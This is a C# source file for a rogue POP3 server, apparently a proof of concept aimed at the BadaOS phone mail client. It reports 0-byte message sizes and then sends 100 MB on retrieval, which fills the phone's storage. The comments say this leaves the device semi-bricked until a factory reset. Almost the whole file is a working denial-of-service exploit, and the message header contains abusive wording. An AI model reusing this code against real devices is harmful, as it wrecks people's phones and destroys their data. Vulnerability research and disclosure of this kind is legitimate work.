using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace BadaMailStorageDoS
{
    internal class Program
    {
        static StreamReader sr = null;
        static string guid = Guid.NewGuid().ToString();
        static void Main(string[] args)
        {
            // BadaOS Mail storage DoS.
            // The email client included in the OS
            // checks only LIST's byte size for
            // message size, meaning when someone
            // sends a byte size of 0 bytes
            // the email client thinks the
            // message is small and doesn't
            // display a warning to the user,
            // and when Bada RETRs the message
            // the server sends 100 MB of data
            // causing the 80 MB free storage
            // to fill up to a temp folder
            // and not get cleared properly
            // because bada stops the download,
            // forgets to clear the temp,
            // and kicks the user back to the
            // email inbox ui,
            // causing a total loss of free space
            // and a semi-bricked phone.
            //
            // The only solution / recovery i found for this
            // was to factory reset the phone using the
            // *2767*3855# service code in the dialer
            // the factory reset setting in the settings app
            // only formats user accessible folders,
            // not the entire system.
            Console.Title = "Crash My Bada v12.0";
            Console.WriteLine($"[SERVER] gen uid {guid}");
            Console.Write("Enter IP: ");
            string ipaddr = Console.ReadLine();
            Console.WriteLine("create");
            IPAddress ip = IPAddress.Parse(ipaddr);
            TcpListener server = new TcpListener(ip, 110); // my lawyer advised me to not use 110 lmao but it's on my lan only
            Console.WriteLine($"created POP3 server on {ip}, starting");
            server.Start();
            while (true)
            {
                Console.WriteLine("waiting for client");
                TcpClient client = server.AcceptTcpClient();
                Console.WriteLine($"Welcome, {client.Client.RemoteEndPoint}!");
                NetworkStream networkStream = client.GetStream();
                networkStream.ReadTimeout = 60000; // 60 secs
                Console.WriteLine("got stream");
                Send(networkStream, Encoding.ASCII.GetBytes("+OK\r\n"));
                try
                {
                    while (client.Connected)
                    {
                        string line = ReadLine(networkStream);
                        if (line == null) break;
                        ParsePOPCommand(networkStream, line);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"client exception: {e.Message}");
                }
                finally // run even if exception occurs
                {
                    sr = null;
                    client.Close();
                    Console.WriteLine("closed client conn");
                }
            }
        }
        static string ReadLine(NetworkStream stream)
        {
            if (sr == null)
            {
                sr = new StreamReader(stream);
            }
            return sr.ReadLine(); // don't catch it, it'll be caught in Main()
        }
        static void Send(NetworkStream stream, byte[] data)
        {
            try
            {
                stream.Write(data, 0, data.Length);
                stream.Flush();
                //Console.WriteLine(Encoding.ASCII.GetString(data));
                Console.WriteLine($"send {data.Length} bytes");
            }
            catch (Exception e)
            {
                Console.WriteLine($"ERROR SENDING!!! {e.Message}");
            }
        }
        static void ParsePOPCommand(NetworkStream stream, string command)
        {
            string[] parts = command.Split(' ');
            Console.WriteLine($"Client sent: {command}");
            string messageheader = $"From: <vuln@exploit.com>\r\n" +
                $"To: <you@youpieceofshit.com>\r\n" +
                $"Subject: do NOT download this message!!! you'll regret it.";
            switch (parts[0].ToUpper())
            {
                case "USER":
                    Send(stream, Encoding.ASCII.GetBytes("+OK\r\n"));
                    break;
                case "PASS":
                    Send(stream, Encoding.ASCII.GetBytes("+OK\r\n"));
                    break;
                case "STAT":
                    Send(stream, Encoding.ASCII.GetBytes("+OK 1 0\r\n")); // send 0 bytes to make the client think that we have a short mesg
                    break;
                case "UIDL":
                    Send(stream, Encoding.ASCII.GetBytes($"+OK\r\n1 {guid}\r\n.\r\n"));
                    break;
                case "LIST":
                    Send(stream, Encoding.ASCII.GetBytes("+OK\r\n1 0\r\n.\r\n")); // send 0 bytes to make the client think that we have a short mesg
                    break;
                case "TOP":
                    Send(stream, Encoding.ASCII.GetBytes($"+OK\r\n{messageheader}\r\n\r\nHello world!!!\r\n.\r\n"));
                    break;
                case "RETR":
                    Send(stream, Encoding.ASCII.GetBytes($"+OK\r\n{messageheader}\r\n\r\n{new string('a', 100 * 1024 * 1024)}\r\n.\r\n")); // "april fools!!!" slap 100 megabytes of email data back to the client
                    guid = Guid.NewGuid().ToString();
                    Console.WriteLine($"[SERVER] gen uid {guid}");
                    break;
                case "QUIT":
                    Send(stream, Encoding.ASCII.GetBytes("+OK\r\n"));
                    break;
                default:
                    Console.WriteLine($"[SERVER] unknown command - {command}");
                    Send(stream, Encoding.ASCII.GetBytes("-ERR\r\n"));
                    break;
            }

        }
    }
}
